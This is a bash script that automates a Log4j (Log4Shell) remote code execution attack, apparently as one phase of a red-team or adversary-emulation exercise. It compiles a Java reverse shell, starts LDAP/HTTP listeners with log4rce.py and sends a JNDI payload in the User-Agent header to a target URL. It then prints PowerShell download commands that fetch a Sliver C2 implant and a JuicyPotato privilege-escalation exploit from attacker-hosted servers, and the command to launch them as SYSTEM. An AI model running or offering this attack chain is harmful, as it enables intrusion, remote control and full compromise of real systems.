#!/bin/bash

attacker_ip="94.249.192.1" # IP address of the host executing this script
vulnerable_url="http://208.11.21.100:8080/msn_apps/api/vulnerable/user" # Url vulnerable to Log4j
reverse_shell="./Togepi" # Do not include file extention, e.g. '/home/user/folder/ReverseShell'
privesc_payload_url='http://94.249.192.5:8000/zapdos.exe' # Location of where the Sliver malware is hosted
c2_payload_url='http://94.249.192.5:8000/porygon.exe' # Location of where the Sliver malware is hosted
log4rce="./log4rce.py" # Path to log4rce.py


cat << "EOF"

______ _                        ___ 
| ___ \ |                      /   |
| |_/ / |__   __ _ ___  ___   / /| |
|  __/| '_ \ / _` / __|/ _ \ / /_| |
| |   | | | | (_| \__ \  __/ \___  |
\_|   |_| |_|\__,_|___/\___|     |_/

EOF

# 0. Reminders/Prep
printf "\n\nPre-Flight checklist:\n"
printf "[] Did you start you TCP reverse shell listener (e.g. netcat)?\n"
printf "[] Did you update IP/Port in ReverseShell.java to match the reverse shell listener?\n"
printf "[] Did you verify all variables at the top of $(basename "$0") script are properly set?\n"
printf "\n\n"

for i in {7..1}; do
    echo -ne "Executing in: $i\r"
    sleep 1
done


# 1. Compile reverse shell payload
printf '   [+] Compiling reverse shell payload ...\n'
javac -source 1.7 -target 1.7 $reverse_shell.java -Xlint:-options
printf "\n   [+] Reverse shell compiled ...\n"
sleep 1


# 2. Execute log4rce.py, which will start listeners to deliver java reverse shell paylaod
cat << "EOF"
 _                   ___              
| |                 /   |             
| |     ___   __ _ / /| |_ __ ___ ___ 
| |    / _ \ / _` / /_| | '__/ __/ _ \
| |___| (_) | (_| \___  | | | (_|  __/
\_____/\___/ \__, |   |_/_|  \___\___|
              __/ |                   
             |___/  
EOF

printf "\n   [+] Starting LDAP server listener ...\n"
python3 $log4rce --java_class $reverse_shell.class --ldap_rhost "$attacker_ip" --http_rhost "$attacker_ip" --http_port 8080 &
sleep 3


# 3. Send web request which triggers Log4j vulnerability in the User-Agent field
printf "\n   [+] Triggering Log4j exploit ...\n"
curl -A "\${jndi:ldap://$attacker_ip:1387/ReverseShell}" $vulnerable_url &
sleep 5


# 4. Kill the python and curl processes to save resources
printf "\n   [+] Killing python and curl processes for cleanup ...\n"
pkill -9 -f 'log4rce.py'
sleep 1
pkill -9 -f 'curl -A'
sleep 1
printf "\n\n   [+] Log4j exploit complete, check for reverse shell.\n"
sleep 3

# 5. Move on the next pahse of attack
cat << "EOF"
______     _       _____         
| ___ \   (_)     |  ___|        
| |_/ / __ ___   _| |__ ___  ___ 
|  __/ '__| \ \ / /  __/ __|/ __|
| |  | |  | |\ V /| |__\__ \ (__ 
\_|  |_|  |_| \_/ \____/___/\___|

EOF

printf "\n\n   [+] Transfer and execute the commands below to escalate privileges on the victim host and start C2 beacon as nt authority\\\system:\n"
printf "1. Transfer C2 malware:\n"
printf "powershell -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '$c2_payload_url' -OutFile '%%appdata%%\\\update.exe'\"\n\n"
printf "2. Transfer JuicyPotato exploit:\n"
printf "powershell -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '$privesc_payload_url' -OutFile '%%appdata%%\\\install.exe'\"\n\n"
printf "3. Execute exploit to start the beacon:\n"
printf 'C:/Windows/ServiceProfiles/LocalService/AppData/Roaming/install.exe -l 3388 -t * -p C:/Windows/ServiceProfiles/LocalService/AppData/Roaming/update.exe'